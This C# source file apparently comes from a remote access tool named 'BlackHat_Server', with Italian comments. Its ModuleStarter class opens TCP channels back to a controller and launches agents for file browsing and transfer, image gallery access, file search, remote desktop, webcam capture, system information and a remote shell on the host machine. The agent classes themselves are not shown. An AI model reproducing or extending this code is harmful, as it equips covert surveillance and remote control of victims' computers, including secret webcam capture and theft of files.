using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;

namespace BlackHat_Server
{
    class ModuleStarter
    {
        /// <summary>
        /// Salvo il nuovo stream tra la lista stream in ST e avvio il thread FM
        /// </summary>
        /// <param name="servizio"></param>
        /// <param name="reqID"></param>
        public void StartSlotService(string servizio, string reqID)
        {
            Connection con = new Connection();

            TcpClient ns = con.NewSlotRequest(servizio, reqID);

            ST_Client.Instance.nsListaCanali.Add(ns.GetStream());

            if (ns != null)
            {
                switch (servizio)
                {
                    case "FILEMANAGER":
                        FileManager fm = new FileManager(ns);
                        fm.StartFMThread();
                        break;

                    case "IMAGESLOT":
                        FileManager fmIm = new FileManager(ns);
                        fmIm.StartIMThread();
                        break;

                    case "GALLERYSLOT":
                        FileManager fmGl = new FileManager(ns);
                        fmGl.StartGalleryThread();
                        break;

                    case "SEARCHSLOT":
                        ListFiles lf = new ListFiles(ns.GetStream());
                        lf.StrtListSearch();
                        break;

                    case "FILE_TRANSFER":
                        FileManager fmFt = new FileManager(ns);
                        fmFt.StartTransfThread();
                        break;

                    case "REMOTE_DESKTOP":
                        DesktopAgent da = new DesktopAgent(ns.GetStream());
                        da.StartDesktopListener();
                        break;

                    case "WEBCAM_CAPTURE":
                        WebCamAgent wa = new WebCamAgent(ns.GetStream());
                        wa.StartWebCamListener();                        
                        break;

                    case "SYSTEM_INFO":
                        SystemAgent sa = new SystemAgent(ns.GetStream());
                        sa.StartSystemListener();
                        break;

                    case "REMOTE_SHELL":
                        RemoteShellAgent rsa = new RemoteShellAgent(ns.GetStream());
                        rsa.StartShellListener();
                        break;

                   

                    default:
                        break;
                }
                
            }
            
        }
        //----------------------------------------------------------------------
    }
}
